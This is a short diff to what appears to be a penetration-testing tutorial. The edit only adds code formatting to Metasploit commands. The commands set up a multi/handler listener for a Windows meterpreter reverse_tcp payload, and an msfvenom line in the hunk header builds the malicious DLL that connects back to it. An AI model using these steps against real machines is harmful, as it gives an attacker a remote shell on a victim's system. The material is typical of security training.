@@ -62,10 +62,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-IP-address> LPORT=<p
 
 Run the following commands options:
  
- - use exploit/multi/handler
- - set payload windows/x64/meterpreter/reverse_tcp
- - set lhost {your-ip-address}
- - set lport {port}
+ - `use exploit/multi/handler`
+ - `set payload windows/x64/meterpreter/reverse_tcp`
+ - `set lhost {your-ip-address}`
+ - `set lport {port}`
 
 **Note**: The value for **LHOST** and **LPORT** must be the same values you used to create the malicious DLL.
 
